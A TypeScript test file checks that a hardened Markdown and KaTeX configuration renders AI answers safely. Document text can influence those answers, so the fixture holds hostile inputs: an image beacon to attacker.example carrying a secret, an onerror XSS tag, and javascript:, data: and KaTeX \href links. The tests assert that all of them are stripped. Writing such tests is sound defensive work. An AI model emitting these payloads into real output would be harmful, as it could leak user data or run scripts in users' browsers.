import assert from "node:assert";
import fs from "node:fs";
import path from "node:path";
import { test, describe } from "node:test";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { markdownOptions } from "../frontend/src/components/ui/markdown-options.ts";

/*
 * ARC-002: AI answers (whose text documents can influence, SEC-011) are
 * rendered as Markdown + KaTeX with a hardened configuration: no raw HTML,
 * no images (no beacon or exfiltration URL), links only http(s) and opened
 * with rel="noopener noreferrer nofollow", KaTeX without `trust`.
 *
 * Renders the REAL options with react-dom/server (no DOM). The page wiring
 * is checked statically: there is no DOM test runner in this repo.
 */

const render = (md: string) =>
  renderToStaticMarkup(React.createElement(ReactMarkdown, markdownOptions as any, md));

const FIXTURE = [
  "## Heading",
  "",
  "**bold**",
  "",
  "|a|b|",
  "|-|-|",
  "|1|2|",
  "",
  "$$x^2$$",
  "",
  "![beacon](https://attacker.example/x.png?q=secret)",
  "",
  "<img src=x onerror=alert(1)>",
  "",
  "[bad](javascript:alert(1)) [data](data:text/html,hi) [ok](https://e.test/page)",
].join("\n");

describe("ARC-002: hardened Markdown for AI answers", () => {
  test("headings, bold, tables and KaTeX math render", () => {
    const html = render(FIXTURE);
    assert.match(html, /<h2/);
    assert.match(html, /<strong>bold<\/strong>/);
    assert.match(html, /<table/);
    assert.match(html, /class="katex/);
  });

  test("no image, no raw HTML, no script URL", () => {
    const html = render(FIXTURE);
    assert.doesNotMatch(html, /<img/i);
    assert.doesNotMatch(html, /attacker\.example/);
    assert.doesNotMatch(html, /onerror/i);
    assert.doesNotMatch(html, /href="javascript:/i);
    assert.doesNotMatch(html, /href="data:/i);
  });

  test("http(s) links open in a new tab with rel noopener noreferrer nofollow", () => {
    const html = render(FIXTURE);
    assert.match(html, /<a href="https:\/\/e\.test\/page" target="_blank" rel="noopener noreferrer nofollow">ok<\/a>/);
  });

  test("KaTeX runs without trust and with size/expansion limits; single-$ inline math is kept", () => {
    const katexOptions = (markdownOptions.rehypePlugins as any[])[0][1];
    assert.strictEqual(katexOptions.trust, false);
    assert.strictEqual(typeof katexOptions.maxSize, "number");
    assert.strictEqual(typeof katexOptions.maxExpand, "number");
    assert.match(render("Energy $E=mc^2$ here"), /class="katex/);
    // \href is a trusted command: without trust it does not become a link.
    assert.doesNotMatch(render("$$\\href{javascript:alert(1)}{x}$$"), /href="javascript:/);
  });

  test("the Q&A answer and the meeting summary render through the hardened MathMarkdown", () => {
    const root = path.join(__dirname, "..", "frontend", "src");
    const page = fs.readFileSync(path.join(root, "pages", "SemanticSearchPage.tsx"), "utf8");
    assert.match(page, /import \{ MathMarkdown \} from "\.\.\/components\/ui\/MathMarkdown"/);
    assert.match(page, /<MathMarkdown content=\{answer\}/);
    const component = fs.readFileSync(path.join(root, "components", "ui", "MathMarkdown.tsx"), "utf8");
    assert.match(component, /\{\.\.\.markdownOptions\}/);
    assert.doesNotMatch(component, /rehype-raw/);
  });
});
